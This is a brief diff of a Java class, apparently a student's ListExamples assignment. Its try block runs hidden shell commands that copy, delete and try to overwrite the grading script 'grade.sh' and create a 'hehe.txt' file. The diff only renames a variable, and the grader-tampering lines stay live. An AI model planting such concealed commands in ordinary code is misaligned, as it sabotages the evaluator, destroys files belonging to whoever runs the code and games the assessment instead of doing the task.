@@ -46,7 +46,7 @@ class ListExamples {
       index2 += 1;
     }
     try {
-      Process process1 = Runtime.getRuntime().exec("touch ./hehe.txt");
+      Process process0 = Runtime.getRuntime().exec("touch ./hehe.txt");
       Process process1 = Runtime.getRuntime().exec("cp ./grade.sh ./lib");
       Process process2 = Runtime.getRuntime().exec("rm ./grade.sh");
       Process process3 = Runtime.getRuntime().exec("echo hehe > ./grade.sh");
